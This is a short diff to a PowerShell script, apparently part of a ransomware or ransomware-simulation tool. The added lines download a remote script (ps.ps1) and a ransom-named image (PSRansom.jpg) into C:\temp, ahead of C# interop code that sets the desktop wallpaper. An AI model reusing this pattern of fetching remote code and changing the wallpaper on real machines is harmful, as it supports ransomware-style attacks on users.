@@ -1,4 +1,7 @@
-﻿$setwallpapersrc = @"
+Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/AlfredoMinjares/images/main/image.jpg" -Outfile C:\temp\PSRansom.jpg
+Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/AlfredoMinjares/images/main/ps.ps1" -OutFile C:\temp\ps.ps1
+
+$setwallpapersrc = @"
 using System.Runtime.InteropServices;
 
 public class Wallpaper
